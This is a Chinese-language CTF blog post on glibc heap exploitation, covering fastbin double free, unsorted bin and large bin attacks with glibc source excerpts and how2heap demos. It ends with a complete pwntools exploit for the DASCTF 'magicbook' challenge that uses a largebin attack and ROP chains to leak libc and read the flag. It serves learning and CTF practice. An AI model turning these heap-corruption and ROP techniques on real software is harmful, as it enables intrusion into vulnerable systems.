
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>bin | Masco&#39;s blog</title>
    <meta name="author" content="Masco" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/background1.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>







<script src="https://s4.zstatic.net/ajax/libs/twikoo/1.6.31/twikoo.all.min.js"></script>



<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  

  <canvas
    id="fireworks"
    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
></canvas>
<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
<script src="/js/fireworks.min.js"></script>

    <canvas
    id="background"
    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"
></canvas>
<script src="/js/background.min.js"></script>


    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>fufufufu~</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>MASCO&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;MASCO&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>bin</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/7/18
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/pwn/" style="color: #ff7d73">
                    pwn
                </a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/CTF/" style="color: #00a596">
                    CTF
                </a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/heap/" style="color: #ffa2c4">
                    heap
                </a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <hr>
<h1 id="堆中bin的利用"><a href="#堆中bin的利用" class="headerlink" title="堆中bin的利用"></a>堆中bin的利用</h1><span id="more"></span>
<h2 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h2><p>个人觉得fastbin attack总结起来其实利用就只有两个，double free、地址任意分配。   </p>
<p>1、首先fastbin是由什么来进行管理的呢？<br>答案是fastbinY数组进行管理，这个数组是main_arena的一个成员变量，数组的最大下标是7.<br>由fastbin所管理的chunk，根据其chunk的大小的不同从而进入不同的fastbinY中，大小顺序是从0x20-0x80，依次对应不用的数组下标。    </p>
<p>1、在fastbin中，它的prev_in_use位总是为1的。</p>
<pre><code>static void _int_free (mstate av, mchunkptr p, int have_lock)
&#123;
size = chunksize (p);    //获取p的size
check_inuse_chunk(av, p);//检查p的物理相邻的下一个堆块的inuse位是否置1

//检查p的大小是否小于global_max_fast
if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())
    #if TRIM_FASTBINS
        //检查p物理相邻的堆块是否是top chunk
        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)
    #endif
    ) 
&#123;
    //检查p的物理相邻下个堆块是否存在,且大小是否满足最小和最大要求
    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)
        || __builtin_expect (chunksize (chunk_at_offset (p, size))
                &gt;= av-&gt;system_mem, 0))
        &#123;.......&#125;

    //对chunk的data块通过memset赋值，但是默认情况下是不进行操作    
    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);
    //设置 malloc_state的flag
    set_fastchunks(av);

    //获取p对应大小的fastbinY的索引
    unsigned int idx = fastbin_index(size);
    //fb指向对应大小的fastbinY的地址
    fb = &amp;fastbin (av, idx);

    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */
    // old为 对应大小的fastbinY的fd值，也就是第一个对块的地址
    mchunkptr old = *fb, old2;
    unsigned int old_idx = ~0u;
    
    do
    &#123;
        // Check that the top of the bin is not the record we are going to add
        //检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)
            if (__builtin_expect (old == p, 0))
        &#123;
            errstr = &quot;double free or corruption (fasttop)&quot;;
            goto errout;
        &#125;
        //获取 fastbin中对应的bin的第一项的索引。
            if (have_lock &amp;&amp; old != NULL)
            old_idx = fastbin_index(chunksize(old));
        //让  p 的fd指向 顶部的fastbin块
            p-&gt;fd = old2 = old;
    &#125;
    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);
    //catomic_compare_and_exchange_val_rel 功能是 如果*fb等于old2，则将*fb存储为p，返回old2；
    // *fb=p 也就是 让对应fastbin的fd指向 p(新加入的堆块)

    //检查fastbin中对应的bin的第一项的大小是否与p(要添加的块)的大小相同。
    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0))
    &#123;
            errstr = &quot;invalid fastbin entry (free)&quot;;
            goto errout;
    &#125;
&#125;
&#125;
</code></pre>
<p>2、在fastbin中常利用的attck就是double free<br> &#x2F;&#x2F;检查 fastbin中对应的bin的第一项 是否 等于 p (新加入的堆块)</p>
<pre><code>        if (__builtin_expect (old == p, 0))
    &#123;
                errstr = &quot;double free or corruption (fasttop)&quot;;
                goto errout;
    &#125;
</code></pre>
<p>看到这一段源码，old对应的是先前free的chunk，p是当前free的chunk。如果两相同的chunk连续进行free程序就会抛出异常。<br>但是我们同时也可以看到，fastbin对doublefree的检查是十分松散的，因为这里只判断了old与p的指针相等。所以我们只需要A-》B-》A这样进行free，就可以绕过检查。   </p>
<p>3、分配顺序<br>fastbin分配的chunk总是fastbinY数组所指向的第一个chunk。  </p>
<p>fastbin是一个只有fd的单向链表并遵循先进后出的分配顺序。   </p>
<p>4、attack<br>在fastbin attack中利用的除了double free，还有控制fd指针来进行任意地址分配。不过在进行分配之前需要满足一些条件来绕过检查。  </p>
<pre><code>检测1：检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50，那么就会程序就报错退出）。  

检测2：检测你这个freechunk的size成员的PREV_INUSE为是否为1，为1才可以通过检测。
</code></pre>
<p>所以我们选取的攻击目标地址的偏移size成员数值的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位都要为1，比如当前fastbin所能管理的freechunk大小为0x70~0x80，而伪造的size成员处的数值为0x71、0x72这样的数值不能够符合要求的，但0x7f这样的地址就可以满足需要，因此构造完之后，攻击目标地址的伪造size成员成员数值的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位都要为1，0x7f就可以满足.  </p>
<br>
<br>

<h2 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h2><p>作用：将P-&gt;bk-&gt;fd赋值为P-&gt;fd。</p>
<p>1、首先是unsortedbin 的分配机制，超出了fastbin和tachebin范围的free chunk就会进入unsortedbin中，并且unsortedbin是先从末尾取出chunk进行分配的，后free的chunk会进入先free的chunk的前面。unsortedbin顾名思义，未分类的chunk，所以只要用户重新申请了chunk，unsortedbin中的chunk就会被重新分类，按照其chunk的大小分别进入smallbin、largebin…中。在glibc2.26版本及以下时，还只有fastbin没有tachebin，这时候只要用户free的是大于0x80这个值时就会被free进unsortedbin中。</p>
<p>2、unsortedbin的利用。主要就是利用其中的bk指针</p>
<pre><code>//bck是倒数第二个chunk，victim里存的是倒数第一个chunk
/* remove from unsorted list *   
if (__glibc_unlikely (bck-&gt;fd != victim))
        malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);
unsorted_chunks (av)-&gt;bk = bck;
bck-&gt;fd = unsorted_chunks (av);
</code></pre>
<p>如上所示，里面没有涉及到victim的fd指针，只有其bk以及bck的fd。所以主要利用也是从victim的bk入手，修改其bk为一个我们已知的地址，这样bck就变成了我们的fake_chunk。victim的bk就会指向fake_chunk-0x10的位置。所以当我们重新启用victim时也就是对其malloc时。<br>则fake_chunk-0x10的fd就会指向unsortbin。<br>不过由于我们突然插入的chunk，后续的unsortbin在进行分配时可能会出现问题。</p>
<p>测试案例</p>
<pre><code>How2heap(使用 gcc -g 进行编译)
1 //gcc hollk.c -g -no-pie -o hollk
2 #include &lt;stdio.h&gt;
3 #include &lt;stdlib.h&gt;
4
5 int main() &#123;
6
7   unsigned long target_var = 0;
8   fprintf(stderr,&quot;&amp;target_var and target_var:\n&quot;);
9   fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;target_var, target_var);
10
11   unsigned long *p = malloc(400);
12   fprintf(stderr, &quot;The first chunk_addr at: %p\n&quot;,p);
13
14   malloc(500);
15
16   free(p);
17   fprintf(stderr, &quot;The first chunk_bk is %p\n&quot;,(void *)p[1]);
18
19   p[1] = (unsigned long)(&amp;target_var - 2);
20   fprintf(stderr, &quot;Now,The first chunk_bk is %p\n\n&quot;, (void *)p[1]);
21
22   malloc(400);
23   fprintf(stderr, &quot;target has been rewrite %p: %p\n&quot;, &amp;target_var, (void *)target_var);
24 &#125;
</code></pre>
<br>
<br>

<h2 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h2><p>(总的来说，利用方法与unsortedbin差不多，并且其中的利用效果都一样，只是largebin除了可以利用bk还可以利用bk_nextsize）</p>
<p>1、规则<br>（1）、共有63个bins，每个bin的size域值各不相同，但是公差是一致的。（大于0x3F0的chunk在遍历后进入largebin，反之小于的则进入到smallbin）<br>（2）、由大到小进行存储，若大小一致则按照时间顺序存储。（小的chunk链接到largebin）</p>
<p>2、新增fd_nextsize与bk_nextsize这两指针。fd_nextsize的作用是记录前面第一个与此chunk的size不同的chunk的地址，而bk_nextsize则是记录后面第一个与此chunk的size不同的chunk的地址。（只有第一个chunk的fd&#x2F;bk_nextsize进行记录，其他的默认为0）<br><br><br>3、attack<br>已知largebin对chunk进行操作有三种情况<br>（进行伪造工作的chunk是chunk_B又名P2，chunk_A是P3其size大于P2）</p>
<p>（1）、chunk_A大于chunk_B</p>
<p>（2）、chunk_A小于chunk_B</p>
<p>（3）、chunk_A等于chunk_B</p>
<p>又得知，largbin是按chunk由大到小进行排列的，小的那一方chunk靠近largebin<br>又又得知，对chunk进行操作的三种情况      </p>
<p>（其中chunk_A是P3，chunk_B是P2，p2-&gt;bk是value1-0x10，p2-&gt;bk_nextsize是value2-0x20）<br>(1)、vitim&gt;fwd<br><img src="/images/u1.png" alt="图片"><br>可以看到这里的victim被赋了一系列的值，bk_nextsize,bk都被fwd赋了值  </p>
<p>（2）、victim&lt;fwd<br><img src="/images/u2.png" alt="图片">   </p>
<p>（3）、victim&#x3D;&#x3D;fwd<br><img src="/images/u3.png" alt="图片"></p>
<p>另外需要注意，伪造的堆块fd_nextsize需要设置为0.不然无法通过以下unlink检查。（需要进行伪造的free chunk是victim）<br>    size &#x3D; chunksize (victim);</p>
<pre><code>/*  We know the first chunk in this bin is big enough to use. */
assert ((unsigned long) (size) &gt;= (unsigned long) (nb));

remainder_size = size - nb;

/* unlink */
unlink_chunk (av, victim);
</code></pre>
<p>测试案例（how2heap gcc-g 编译）  </p>
<pre><code>// gcc -g 
2 #include &lt;stdio.h&gt;
3 #include &lt;stdlib.h&gt;
4
5 int main()
6 &#123;
7
8     unsigned long stack_var1 = 0;
9     unsigned long stack_var2 = 0;
10
11     fprintf(stderr, &quot;stack_var1 (%p): %ld\n&quot;, &amp;stack_var1, stack_var1);
12     fprintf(stderr, &quot;stack_var2 (%p): %ld\n\n&quot;, &amp;stack_var2, stack_var2);
13
14     unsigned long *p1 = malloc(0x320);
15     malloc(0x20);
16     unsigned long *p2 = malloc(0x400);
17     malloc(0x20);
18     unsigned long p3 = malloc(0x400);
19     malloc(0x20);
20
21     free(p1);
22     free(p2);
23
* 24     void* p4 = malloc(0x90);
25
26     free(p3);
27
28     p2[-1] = 0x3f1;
29     p2[0] = 0;
30     p2[2] = 0;
31     p2[1] = (unsigned long)(&amp;stack_var1 - 2);
32     p2[3] = (unsigned long)(&amp;stack_var2 - 4);
33
34     malloc(0x90);
35
36     fprintf(stderr, &quot;stack_var1 (%p): %p\n&quot;, &amp;stack_var1, (void *)stack_var1);
37     fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2);
38
39     return 0;
40 &#125;      
</code></pre>
<br>

<h2 id="largbinattck-例题"><a href="#largbinattck-例题" class="headerlink" title="largbinattck 例题"></a>largbinattck 例题</h2><h3 id="DASCTF-magicbook"><a href="#DASCTF-magicbook" class="headerlink" title="DASCTF magicbook"></a>DASCTF magicbook</h3><p>于ubuntu题集中，magicbook文件夹  </p>
<pre><code>#!/usr/bin/python3
from pwn import *
from LibcSearcher import *
import os


#context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)


#context.terminal = [&#39;xterm&#39;, &#39;-e&#39;]
context.terminal = [&#39;xfce4-terminal&#39;, &#39;-e&#39;]
#终端更换

p=process(&quot;./pwn&quot;)
#p= remote()
libc = ELF(&quot;libc.so.6&quot;)
elf = ELF(&quot;./pwn&quot;)

def op():
    gdb.attach(p)
    pause()

def inter():
    p.interactive()
    
def sa(content,payload):
    p.sendafter(content,payload)
    
def sla(content,payload):
    p.sendlineafter(content,payload)

def uc64():
    u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))

def uc32():
    u32(p.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))

def exec_fmt(pad):#自动获取到fmt的pad
        p = process(&quot;./fmt&quot;)
        # send 还是 sendline以程序为准
        p.send(pad)
        return p.recv()
def add(size):
    sla(&quot;choice:&quot;,str(1))
    sla(&quot;need?&quot;,str(size))

def free(index):
    sla(&quot;choice:&quot;,str(2))
    sla(&quot;delete?&quot;,str(index))

def edit(content):
    sla(&quot;choice:&quot;,str(3))
    sa(&quot;story!&quot;,content)


p.recvuntil(b&quot;0x&quot;)
gift=int(p.recv(12),16)-0x4010
bk_adr=gift+0x4050
bss=gift+0x4010
print(&quot;gift=&quot;,hex(gift))
print(&quot;book=&quot;,hex(bk_adr))
                                                   #（largebin attack）
                                                   
add(0x4e0)
add(0x100)
add(0x4d0)
free(0)
p.sendline(b&#39;n&#39;)
add(0x500)
free(2)
p.recvuntil(b&quot;(y/n)&quot;)
p.sendline(b&#39;y&#39;)
p.recvuntil(b&quot;write?&quot;)
p.sendline(b&#39;0&#39;)
p.recvuntil(b&quot;content: &quot;)
p.send(p64(0)*2+p64(bk_adr-0x20))
add(0x500)                                         #（largebin attack）



rdi=0x0000000000001863+gift
payload=b&#39;a&#39;*0x28+p64(rdi)+p64(elf.got[&#39;puts&#39;]+gift)+p64(gift+elf.plt[&#39;puts&#39;])+p64(gift+0x15E1)
edit(payload)
#p.recvuntil(b&#39;a&#39;*0x28)
got=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(&quot;got=&quot;,hex(got))
got=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(&quot;got=&quot;,hex(got))
base=got-libc.sym[&#39;puts&#39;]
print(&quot;base=&quot;,hex(base))
rsi=base+0x000000000002be51
rdx_rbx=0x00000000000904a9+base
o=libc.sym[&#39;open&#39;]+base
r=libc.sym[&#39;read&#39;]+base
w=libc.sym[&#39;write&#39;]+base
gets=libc.sym[&#39;gets&#39;]+base
bss=gift+0x4090
print(&quot;bss=&quot;,hex(bss))
payload=b&#39;a&#39;*0x28+p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x8)+p64(0)+p64(r)+p64(gift+0x15E1)
p.send(payload)
sleep(0.1)
p.send(b&#39;flag\x00\x00\x00&#39;)
print(&quot;gets=&quot;,hex(gets))
sleep(0.1)
sleep(0.1)
orw=p64(rdi)+p64(bss)+p64(rsi)+p64(0)+p64(o)
orw+=p64(rdi)+p64(3)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x30)+p64(0)+p64(r)
orw+=p64(rdi)+p64(1)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x30)+p64(0)+p64(w)
p.send(b&#39;a&#39;*0x28+orw)
inter()
</code></pre>
<hr>

    </div>
    
    
    
    
    
    
    <div id="comment">
        <div id="twikoo-container"></div>
    </div>
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2024 - 2024 Masco&#39;s blog
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Masco
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    



<script>
    twikoo.init({
        el: "#twikoo-container",
        envId: "",
        region: "",
        path: location.pathname,
        lang: "",
    })
</script>


    
</body>
</html>